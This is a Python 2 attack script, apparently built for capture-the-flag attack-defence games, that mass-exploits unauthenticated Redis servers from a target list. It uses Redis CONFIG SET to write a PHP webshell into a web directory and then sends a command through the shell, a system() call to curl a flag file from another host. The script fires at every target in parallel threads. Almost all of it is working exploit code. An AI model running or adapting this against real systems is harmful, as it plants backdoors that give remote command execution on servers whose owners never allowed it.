# -*- coding:utf-8 -*-

import redis
import ConfigParser
import threading
import requests
from random import Random

def load_payload():
    cf = ConfigParser.ConfigParser()
    cf.read("config.ini")
    payload_t = cf.get('baseconf', "payload")
    # print payload_t
    with open(payload_t, 'rb+') as f:
        str = ""
        for line in f.readlines():
            str = str + " " + line.strip('\n\r')
        f.close()
    # str="<?php if(isset($_REQUEST['cmd'])) { echo '<pre>';'111111111111111'{1}{0}"
    # print str
    if payload_t == "mem.php":
        attack_ip = cf.get("baseconf", "attack_ip")
        flag_url = cf.get("baseconf", "flag_url")
        str = str.format(attack_ip=attack_ip, flag_url=flag_url)
    elif payload_t == "one.php":
        str = str.format(password=cf.get('baseconf', "password"))
    # print str
    return str
def random_str(randomlength=8):
    str = ''
    chars = 'abcdefghijklmnopqrstuvwxyz0123456789'
    length = len(chars) - 1
    random = Random()
    for i in range(randomlength):
        str+=chars[random.randint(0, length)]
    return str
def attack(ip,payload):
    php_name = random_str();
    r = redis.StrictRedis(host=ip, port=6379, db=0)
    r.config_set('dir', '/var/www/8011')
    r.config_set('dbfilename', php_name+".php")
    r.set("webshell", payload)
    r.save()
    print payload
    #print "http://" + ip + ":8011/{0}.php".format(php_name)
    url_1="http://" + ip + ":8011/{0}.php".format(php_name)
    #print checkPayload(url_1)
    if requests.codes.ok == checkPayload(url_1):
        print url_1, "shell上传成功"
    else:
        print url_1, "shell上传失败"
def checkPayload(payloadUrl):
    print payloadUrl
    head123={"Content-Type": "application/x-www-form-urlencoded"};
    payloads={'pass':'system("curl http://192.168.0.112/flag.txt");'}

    sss=requests.post(payloadUrl,timeout=5,data=payloads,headers=head123)
    s=(sss.content).find("webshell")
    print (sss.content).find("webshell")
    print (sss.content)[s:100]
    return requests.get(payloadUrl,timeout=5).status_code


if __name__=="__main__":
    ipList = []
    with open("url.txt", 'rb+') as f:
        for info in f.readlines():
            if not info.startswith('#') and info.strip():
                ipList.append(info.strip())
    threads = []
    # print shell
    for ip in ipList:
        # print ip
        t = threading.Thread(target=attack, args=(ip, load_payload()))
        threads.append(t)
    for t in threads:
        t.start()
        # print "program exit"
